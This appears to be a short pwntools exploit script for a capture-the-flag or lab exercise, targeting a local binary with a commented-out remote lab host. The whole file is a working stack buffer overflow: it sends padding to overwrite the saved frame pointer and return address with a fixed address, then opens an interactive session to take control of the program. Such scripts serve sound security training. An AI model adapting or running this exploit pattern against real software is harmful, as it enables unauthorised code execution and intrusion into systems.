from pwn import *

r = process('/media/sf_D_DRIVE/Git/test/testOut')
# r = remote('lab.scist.org', 33303)

r.send((b'a') * 0x20 + (b'a') * 8 + p64(0x000000000000115c))

r.interactive()
